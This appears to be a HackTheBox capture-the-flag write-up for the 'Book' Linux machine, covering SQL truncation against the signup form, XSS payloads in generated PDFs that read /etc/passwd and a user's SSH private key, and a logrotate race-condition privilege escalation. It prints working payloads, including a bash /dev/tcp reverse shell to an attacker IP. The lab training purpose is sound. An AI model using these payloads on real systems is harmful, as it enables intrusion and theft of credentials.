---
title: Write-up Book Machine
author: pcw3r
date: 2020-07-10 10:00:00 +0800
categories: [HackTheBox, Pentest]
tags: [LINUX, MEDIUM, ENUMERATION, DATABASE EXPLOITATION, SQL TRUNCATION, CROSS-SITE SCRIPTING, RACE CONDITION, PAYLOAD]
math: true
---

**<center>RefÂ°: HTB-10-Pentest</center>**

![Desktop View]({{ "/assets/img/book/HTB-Badge-Book.png" | relative_url }})

--- Book is a Linux machine that highlights SQL truncation to bypass admin password and the execution of xss attack in PDF to read and recover passwd file and id_rsa of reader user.

The private key has no password and allow the connection on ssh to gain foothold.

And we can winning a race condition in logrotate to elevate privileges.

![Desktop View]({{ "/assets/img/book/HTB-Information-Book.png" | relative_url }})

## **<span style='color:#c0392b'>Discovery - Figure out environment</span>**
### Check all services
***
We find services `web` and `ssh` on their usual ports.

```terminal
$ nmap -A -T5 10.10.10.176 -p-
```

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-nmap.png" | relative_url }})

### Website on port 80
***
We have the possibility to create account and access like simple user.

Here we register :

* Username : `userdemo`
* Email : `userdemo@book.com`
* Password : `userdemo`

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-signup.png" | relative_url }})

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-signin.png" | relative_url }})

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-userinterface.png" | relative_url }})

`Collections` area seem to let us upload file on the server :

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-userinterface2.png" | relative_url }})

And `Contact Us` reveal admin mailbox : `admin@bootk.htb`

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-userinterface3.png" | relative_url }})

### Scan website path with Dirb
***
Dirb scan reveal an other path on the website, named `admin` :

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-dirb.png" | relative_url }})

Other paths are forbidden.

### Source page
***
The source page reveal interesting script in main page.
We have character limit included in the application.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-source-page.png" | relative_url }})

## **<span style='color:#c0392b'>Foothold - Get into the target </span>**
### Bypassing Authentication with SQL Truncation
***

We can perform `sql truncation` on the signup page to bypass admin password.

References - sql truncation :
* <https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html>

We enable Burpsuite to intercept signup request with values :

* Username : `admin` --> True value in target database
* Email : `admin@book.htb` --> True value in target database
* Password : `admindemo` --> New password value

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-admin.png" | relative_url }})

We intercept the request, and add 6 space input after email to result 20 characters.
All values afterwards are not taken into consideration.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-burpinterception.png" | relative_url }})

We add false email `adminexploit@book.com`.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-sqltruncation.png" | relative_url }})

And we bypass admin account with our password on `http://10.10.10.176/admin`.

* Email : `admin@book.htb` --> True value in target database
* Password : `admindemo` --> New password value

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-sqltruncationexploit.png" | relative_url }})

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-admininterface.png" | relative_url }})

We can export PDF to list all users who are access on the user panel and all collections uploaded from users.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-admininterface2.png" | relative_url }})

All PDF seem to be automatically generated.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-pdf.png" | relative_url }})

## **<span style='color:#c0392b'>Lateral Movement - Move through environment</span>**
### Cross Site Scripting
***
In this case, we can `read local file` on the target via `XSS in Dynamically Generated PDF`.

References - xss attack :
* <https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>
* <https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html>
* <https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#read-local-file>

From user panel, we test if javascript is executed on the "Author" field when we upload it with any pdf.

```
<img src=x onerror=document.write('aaaa')>
```

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-jsexecution.png" | relative_url }})

The submission work correctly.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-msg.png" | relative_url }})

From admin panel in collections area, we export Collections PDF to generated new PDF.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-admininterface2.png" | relative_url }})

Javascript is executed when inject into Author field and return the value in new PDF.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-jsexecutionwork.png" | relative_url }})

We try the same method to read `/etc/passwd`

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-exploitxss.png" | relative_url }})

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-passwd.png" | relative_url }})

We result the target to gain a foothold : `reader`

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-target.png" | relative_url }})

Now, we try to get her `id_rsa` file from `home/reader/.ssh/`

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

Works ! We recover this to attempt cracking password and connect on ssh.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-id_rsa.png" | relative_url }})

For some reason, the copy-past of the id_rsa from Firefox into new file dont work correctly ...

The issue is resolve when we do this with Chrome.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-id_rsa2.png" | relative_url }})

### Remote Service SSH login
***
![Desktop View]({{ "/assets/img/book/HTB-Images-Book-nopasswordinkey.png" | relative_url }})

Okay, we need to rebuild the right on the private key to use it correctly.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-alertkey.png" | relative_url }})

```
$ chmod +x id_rsa_chrome
$ ssh reader@10.10.10.176 -i id_rsa_chrome
```

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-sshreader.png" | relative_url }})

## **<span style='color:#c0392b'>Privilege Escalation - Gain higher-level permissions</span>**
### Race condition on Logrotate
***
The home reader contain 1 folder named `backups` and 1 script `lse.sh`.
The folder backup contain 2 log files only.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-access-file.png" | relative_url }})

linPEAS scan reveal some privilege-escalation method :

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-linpeas.png" | relative_url }})

But the logrotate exploitation is more interesting (reference about log files presents in home reader).

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-logrotate-exploitation.png" | relative_url }})

pspy tool confirm this trough the execution of `logrotate` tool under root privilege.

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-pspy.png" | relative_url }})


We can winning a race condition in logrotate to elevate privileges.

References - logrotate exploitation :
* <https://github.com/whotwagner/logrotten>
* <https://medium.com/@ashishrohra/race-condition-exaplained-for-dummies-10c54a265192>
* <https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition>
* <https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/>

#### 1 - Requirement

* Logrotate has to be executed as root --> Yes, pspy verify this.
* The logpath needs to be in control of the attacker --> Yes, linpeas verify this
* Any option that creates files is set in the logrotate configuration --> Yes

#### 2 - Compile logrotten

From target machine :

```terminal
reader@book:/tmp$ gcc -o logrotten logrotten.c
```

#### 3 - Prepare payload

```terminal
reader@book:/tmp$ nano payload

bash -i >& /dev/tcp/10.10.14.223/1234 0>&1
```

#### 4 - Listen and wait root shell redirection

From attacking machine :

```terminal
$ nc -lvp 1234
```

#### 5 - Exploit

To trigger the rotation of the log, we write before in access.log.

```terminal
reader@book:/tmp$ echo exploit /home/reader/backups/access.log && ./logrotten -d -p ./payload /home/reader/backups/access.log
```
![Desktop View]({{ "/assets/img/book/HTB-Images-Book-exploit.png" | relative_url }})

### Flag root
***

![Desktop View]({{ "/assets/img/book/HTB-Images-Book-rootflag.png" | relative_url }})

Book machine is compromise.

***

## **<center>Trophy</center>**

> **There is no friend as loyal as a book.**
>
> Ernest Hemingway
